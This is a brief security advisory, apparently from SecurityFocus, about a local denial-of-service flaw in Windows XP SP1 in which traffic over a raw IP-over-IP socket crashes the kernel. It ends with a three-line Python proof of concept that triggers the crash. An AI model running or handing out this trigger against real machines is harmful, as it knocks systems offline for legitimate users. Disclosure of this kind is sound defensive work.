source: http://www.securityfocus.com/bid/12870/info

It is reported that Microsoft Windows XP Service Pack 1 is prone to a local denial of service vulnerability.

The issue is reported to manifest when a raw IP over IP socket is created and data is transferred over the newly created socket.

It is reported that this operation causes the kernel of the Windows computer to crash, resulting in the computer rebooting. If this issue can be triggered reliably, a local attacker may exploit the issue to deny service for legitimate users.

Further investigation into this issue is ongoing; this BID will be updated as soon as more details are available. 

import socket
s=socket.socket(socket.AF_INET,socket.SOCK_RAW,4)
s.sendto("",("x.x.x.x",0))

Press ENTER and your win box should crash immediately. 